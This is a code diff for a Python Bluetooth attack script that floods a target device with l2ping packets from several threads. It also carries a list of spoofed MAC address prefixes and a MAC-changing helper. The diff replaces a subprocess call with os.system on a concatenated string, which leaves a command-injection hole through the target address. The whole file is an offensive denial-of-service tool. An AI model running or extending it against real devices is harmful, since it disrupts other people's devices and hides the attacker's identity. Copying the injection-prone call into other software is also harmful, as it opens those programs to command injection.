@@ -1,23 +1,17 @@
 import subprocess
-import multiprocessing
+import threading
 import time
 import os
 import re
-from dotenv import load_dotenv
 from rich import print
 from rich.console import Console
-from utils.macaddress_gen import generate_mac_address
+from .macaddress_gen import generate_mac_address
 # from macaddress_gen import generate_mac_address
-
-load_dotenv()
 
 TARGET_DEVICE_MAC = os.getenv('TARGET_DEVICE_MAC')
 interface = os.getenv('INTERFACES')
 
 console = Console()
-max_threads = 10
-
-threads_count = min(multiprocessing.cpu_count(), max_threads)
 
 # [ OUI Numbers for Mac Address ]
 SPOOFED_MACS = [
@@ -40,8 +34,7 @@ def get_bluetooth_mac_address():
 
 # [ 2x Deauth Method ]
 def deauth_Method_1(target_addr, packages_size):
-    subprocess.Popen(['l2ping', '-i', 'hci0', '-s', str(packages_size), '-f', target_addr], stdout=subprocess.DEVNULL)
-    time.sleep(2)
+    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
 def deauth_Method_2(target_addr, packages_size):
     import bluetooth
@@ -84,9 +77,11 @@ def _kick_(deauth_func, target_addr, packages_size, threads_count, start_time=0)
     #     change_mac_address(interface, spoofed_mac)
     #     multiprocessing.Process(target=Deauth, args=(target_addr, packages_size)).start()
 
-    with multiprocessing.Pool(processes=threads_count) as pool:
-        results = [pool.apply_async(deauth_func, args=(target_addr, packages_size)) for _ in range(threads_count)]
-        [result.get() for result in results]
+    # with multiprocessing.Pool(processes=threads_count) as pool:
+    #     results = [pool.apply_async(deauth_func, args=(target_addr, packages_size)) for _ in range(threads_count)]
+    #     [result.get() for result in results]
+    for i in range(0, threads_count):
+        threading.Thread(target=deauth_func, args=(target_addr, packages_size)).start()
 
 if __name__ == '__main__':
     try:
